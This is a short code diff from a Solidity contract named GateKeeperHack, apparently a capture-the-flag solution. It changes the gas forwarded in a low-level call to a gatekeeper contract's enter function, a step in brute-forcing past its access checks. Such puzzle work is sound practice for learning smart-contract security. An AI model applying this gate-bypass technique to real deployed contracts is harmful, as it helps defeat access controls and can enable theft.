@@ -55,7 +55,7 @@ contract GateKeeperHack {
 
     function tryEnter(uint64 testKey) public {
         bytes8 _gateKey = bytes8(testKey);
-        address(gateKeeper).call{gas: 60150}(
+        address(gateKeeper).call{gas: 8603}(
             abi.encodeWithSignature("enter(bytes8)", _gateKey)
         );
     }
